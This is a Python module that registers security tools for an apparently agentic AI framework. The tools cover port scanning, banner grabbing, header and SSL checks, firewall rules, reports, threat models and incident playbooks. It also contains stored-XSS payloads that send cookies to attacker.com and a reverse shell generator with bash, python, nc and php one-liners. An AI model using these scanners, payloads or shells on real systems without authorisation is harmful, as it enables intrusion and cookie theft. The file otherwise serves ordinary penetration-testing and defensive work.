import socket
import ssl
import json
import datetime
import requests
from ouroboros.tools.registry import ToolEntry

COMMON_PORTS = [21,22,23,25,53,80,110,111,135,139,143,443,445,993,995,1723,3306,3389,5432,5900,8080,8443]

def _port_scan(args, ctx):
    host = args["host"]
    ports = args.get("ports", COMMON_PORTS)
    timeout = args.get("timeout", 1)
    open_ports = []
    for p in ports:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(timeout)
            if s.connect_ex((host, p)) == 0:
                open_ports.append(p)
            s.close()
        except Exception:
            pass
    if not open_ports:
        return f"No open ports found on {host}"
    return f"Open ports on {host}: {', '.join(map(str, open_ports))}"

def _banner_grab(args, ctx):
    host, port = args["host"], args["port"]
    timeout = args.get("timeout", 3)
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(timeout)
        s.connect((host, port))
        s.send(b"HEAD / HTTP/1.0\r\n\r\n")
        banner = s.recv(1024).decode("utf-8", errors="replace").strip()
        s.close()
        return f"Banner from {host}:{port}:\n{banner}" if banner else f"No banner received from {host}:{port}"
    except Exception as e:
        return f"Error grabbing banner from {host}:{port}: {e}"

def _security_headers(args, ctx):
    url = args["url"]
    wanted = ["Content-Security-Policy","Strict-Transport-Security","X-Frame-Options",
              "X-Content-Type-Options","X-XSS-Protection","Referrer-Policy","Permissions-Policy"]
    try:
        r = requests.get(url, timeout=10, allow_redirects=True)
    except Exception as e:
        return f"Error fetching {url}: {e}"
    lines = [f"Security Headers for {url}:"]
    for h in wanted:
        v = r.headers.get(h)
        lines.append(f"  {h}: {v if v else 'MISSING'}")
    missing = [h for h in wanted if h not in r.headers]
    if missing:
        lines.append(f"\nMissing headers ({len(missing)}): {', '.join(missing)}")
    return "\n".join(lines)

def _ssl_checker(args, ctx):
    host = args["host"]
    port = args.get("port", 443)
    try:
        context = ssl.create_default_context()
        with socket.create_connection((host, port), timeout=5) as sock:
            with context.wrap_socket(sock, server_hostname=host) as ssock:
                cert = ssock.getpeercert()
                cipher = ssock.cipher()
                exp = datetime.datetime.strptime(cert["notAfter"], "%b %d %H:%M:%S %Y %Z")
                days = (exp - datetime.datetime.utcnow()).days
                subject = dict(x[0] for x in cert["subject"])
                return (f"SSL Certificate for {host}:{port}\n"
                        f"  Subject: {subject.get('commonName','N/A')}\n"
                        f"  Issuer: {dict(x[0] for x in cert['issuer']).get('organizationName','N/A')}\n"
                        f"  Expires: {cert['notAfter']} ({days} days)\n"
                        f"  Cipher: {cipher[0]} ({cipher[2]} bits)\n"
                        f"  Protocol: {ssock.version()}\n"
                        f"  Status: {'OK' if days > 30 else 'WARNING - expiring soon!' if days > 0 else 'EXPIRED!'}")
    except Exception as e:
        return f"SSL check failed for {host}:{port}: {e}"

def _xss_payloads(args, ctx):
    context = args.get("context", "reflected")
    payloads = {
        "reflected": [
            '<script>alert(1)</script>',
            '"><script>alert(1)</script>',
            "'-alert(1)-'",
            '<img src=x onerror=alert(1)>',
            '<svg/onload=alert(1)>',
        ],
        "stored": [
            '<script>fetch("https://attacker.com/steal?c="+document.cookie)</script>',
            '<img src=x onerror="new Image().src=\'https://attacker.com/?\'+document.cookie">',
            '<body onload=alert(1)>',
        ],
        "dom": [
            'javascript:alert(document.domain)',
            '#<img src=x onerror=alert(1)>',
            '";alert(1)//',
            "'-alert(1)-'",
        ],
    }
    p = payloads.get(context, payloads["reflected"])
    return f"XSS Payloads ({context}):\n" + "\n".join(f"  {i+1}. {x}" for i, x in enumerate(p))

def _reverse_shell_gen(args, ctx):
    ip, port = args["ip"], args["port"]
    shells = {
        "bash": f"bash -i >& /dev/tcp/{ip}/{port} 0>&1",
        "python": f"python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"{ip}\",{port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'",
        "nc": f"nc -e /bin/sh {ip} {port}",
        "php": f"php -r '$s=fsockopen(\"{ip}\",{port});exec(\"/bin/sh -i <&3 >&3 2>&3\");'",
    }
    lang = args.get("language")
    if lang and lang in shells:
        return f"Reverse shell ({lang}):\n  {shells[lang]}"
    return "Reverse Shell One-Liners:\n" + "\n".join(f"  [{k}] {v}" for k, v in shells.items())

def _firewall_rules(args, ctx):
    action = args.get("action", "allow")
    proto = args.get("protocol", "tcp")
    port = args.get("port")
    source = args.get("source", "any")
    fmt = args.get("format", "both")
    lines = [f"Firewall Rules ({action} {proto}/{port} from {source}):"]
    src_flag = f"-s {source} " if source != "any" else ""
    if fmt in ("iptables", "both"):
        act = "ACCEPT" if action == "allow" else "DROP"
        lines.append(f"\n  [iptables]")
        lines.append(f"  iptables -A INPUT -p {proto} {src_flag}--dport {port} -j {act}")
    if fmt in ("ufw", "both"):
        ufw_act = action
        src_part = f" from {source}" if source != "any" else ""
        lines.append(f"\n  [ufw]")
        lines.append(f"  ufw {ufw_act} proto {proto}{src_part} to any port {port}")
    return "\n".join(lines)

def _security_report(args, ctx):
    target = args["target"]
    findings = args.get("findings", [])
    severity = args.get("severity", "medium")
    lines = [
        f"{'='*50}",
        f"SECURITY ASSESSMENT REPORT",
        f"{'='*50}",
        f"Target: {target}",
        f"Date: {datetime.datetime.now().strftime('%Y-%m-%d %H:%M')}",
        f"Overall Severity: {severity.upper()}",
        f"{'='*50}",
    ]
    if findings:
        lines.append("\nFINDINGS:")
        for i, f in enumerate(findings, 1):
            lines.append(f"\n  [{i}] {f.get('title','Untitled')}")
            lines.append(f"      Severity: {f.get('severity','medium')}")
            lines.append(f"      Description: {f.get('description','N/A')}")
            lines.append(f"      Recommendation: {f.get('recommendation','N/A')}")
    else:
        lines.append("\nNo findings provided. Run scans first and add findings.")
    lines.append(f"\n{'='*50}")
    lines.append("END OF REPORT")
    return "\n".join(lines)

def _threat_model(args, ctx):
    system = args["system"]
    components = args.get("components", [])
    stride = {
        "Spoofing": "Can an attacker impersonate a user or component?",
        "Tampering": "Can data be modified in transit or at rest?",
        "Repudiation": "Can actions be performed without accountability?",
        "Information Disclosure": "Can sensitive data leak to unauthorized parties?",
        "Denial of Service": "Can system availability be disrupted?",
        "Elevation of Privilege": "Can an attacker gain higher access than intended?",
    }
    lines = [f"STRIDE Threat Model: {system}", "="*50]
    if components:
        lines.append(f"Components: {', '.join(components)}")
    lines.append("\nThreat Analysis:")
    for cat, question in stride.items():
        lines.append(f"\n  [{cat[0]}] {cat}")
        lines.append(f"      Question: {question}")
        lines.append(f"      Status: NEEDS ASSESSMENT")
        if components:
            for c in components:
                lines.append(f"        - {c}: Review required")
    lines.append(f"\nTotal threat categories: {len(stride)}")
    lines.append(f"Components to assess: {len(components)}")
    return "\n".join(lines)

def _incident_playbook(args, ctx):
    incident_type = args["incident_type"]
    playbooks = {
        "malware": ["Isolate affected systems","Identify malware variant","Preserve forensic evidence","Remove malware","Patch entry vector","Restore from clean backups","Monitor for reinfection"],
        "phishing": ["Identify affected users","Reset compromised credentials","Block sender/domain","Scan for lateral movement","Review email logs","User awareness notification","Update email filters"],
        "data_breach": ["Contain the breach","Assess scope of exposure","Preserve evidence","Notify legal/compliance","Notify affected parties","Remediate vulnerability","Post-incident review"],
        "ddos": ["Activate DDoS mitigation","Enable rate limiting","Contact ISP/CDN provider","Block attack sources","Scale infrastructure","Monitor attack patterns","Document for law enforcement"],
        "ransomware": ["Isolate infected systems","Do NOT pay ransom","Identify ransomware variant","Check for decryption tools","Restore from offline backups","Patch exploitation vector","Report to authorities"],
    }
    steps = playbooks.get(incident_type, ["Identify the incident","Contain the threat","Eradicate the cause","Recover systems","Conduct post-mortem"])
    severity = args.get("severity", "high")
    lines = [
        f"INCIDENT RESPONSE PLAYBOOK: {incident_type.upper()}",
        f"Severity: {severity.upper()}",
        "="*50,
        "\nImmediate Actions:"
    ]
    for i, step in enumerate(steps, 1):
        lines.append(f"  {i}. [ ] {step}")
    lines.append(f"\nEscalation: {'Immediate' if severity == 'critical' else '< 1 hour' if severity == 'high' else '< 4 hours'}")
    lines.append("Communication: Notify SOC lead, CISO, and legal as appropriate")
    return "\n".join(lines)

def get_tools():
    return [
        ToolEntry(name="port_scan", description="TCP connect scan on common ports", parameters={
            "type": "object", "properties": {
                "host": {"type": "string", "description": "Target hostname or IP"},
                "ports": {"type": "array", "items": {"type": "integer"}, "description": "Ports to scan (default: common ports)"},
                "timeout": {"type": "number", "description": "Timeout per port in seconds"}
            }, "required": ["host"]
        }, handler=_port_scan),
        ToolEntry(name="banner_grab", description="Grab service banner from an open port", parameters={
            "type": "object", "properties": {
                "host": {"type": "string", "description": "Target hostname or IP"},
                "port": {"type": "integer", "description": "Port number"},
                "timeout": {"type": "number", "description": "Timeout in seconds"}
            }, "required": ["host", "port"]
        }, handler=_banner_grab),
        ToolEntry(name="security_headers", description="Check HTTP security headers for a URL", parameters={
            "type": "object", "properties": {
                "url": {"type": "string", "description": "URL to check"}
            }, "required": ["url"]
        }, handler=_security_headers),
        ToolEntry(name="ssl_checker", description="Check SSL certificate expiry and cipher details", parameters={
            "type": "object", "properties": {
                "host": {"type": "string", "description": "Hostname to check"},
                "port": {"type": "integer", "description": "Port (default 443)"}
            }, "required": ["host"]
        }, handler=_ssl_checker),
        ToolEntry(name="xss_payloads", description="Generate XSS payloads for testing", parameters={
            "type": "object", "properties": {
                "context": {"type": "string", "enum": ["reflected", "stored", "dom"], "description": "XSS context type"}
            }
        }, handler=_xss_payloads),
        ToolEntry(name="reverse_shell_gen", description="Generate reverse shell one-liners", parameters={
            "type": "object", "properties": {
                "ip": {"type": "string", "description": "Listener IP"},
                "port": {"type": "integer", "description": "Listener port"},
                "language": {"type": "string", "enum": ["bash", "python", "nc", "php"], "description": "Shell language"}
            }, "required": ["ip", "port"]
        }, handler=_reverse_shell_gen),
        ToolEntry(name="firewall_rules", description="Generate iptables/ufw firewall rules", parameters={
            "type": "object", "properties": {
                "action": {"type": "string", "enum": ["allow", "deny"], "description": "Allow or deny"},
                "protocol": {"type": "string", "enum": ["tcp", "udp"], "description": "Protocol"},
                "port": {"type": "integer", "description": "Port number"},
                "source": {"type": "string", "description": "Source IP/CIDR"},
                "format": {"type": "string", "enum": ["iptables", "ufw", "both"], "description": "Output format"}
            }, "required": ["port"]
        }, handler=_firewall_rules),
        ToolEntry(name="security_report", description="Generate a security assessment report", parameters={
            "type": "object", "properties": {
                "target": {"type": "string", "description": "Assessment target"},
                "findings": {"type": "array", "items": {"type": "object"}, "description": "List of finding objects with title, severity, description, recommendation"},
                "severity": {"type": "string", "enum": ["low", "medium", "high", "critical"], "description": "Overall severity"}
            }, "required": ["target"]
        }, handler=_security_report),
        ToolEntry(name="threat_model", description="Build a STRIDE threat model", parameters={
            "type": "object", "properties": {
                "system": {"type": "string", "description": "System name"},
                "components": {"type": "array", "items": {"type": "string"}, "description": "System components"}
            }, "required": ["system"]
        }, handler=_threat_model),
        ToolEntry(name="incident_playbook", description="Generate an incident response playbook", parameters={
            "type": "object", "properties": {
                "incident_type": {"type": "string", "enum": ["malware", "phishing", "data_breach", "ddos", "ransomware"], "description": "Type of incident"},
                "severity": {"type": "string", "enum": ["low", "medium", "high", "critical"], "description": "Incident severity"}
            }, "required": ["incident_type"]
        }, handler=_incident_playbook),
    ]
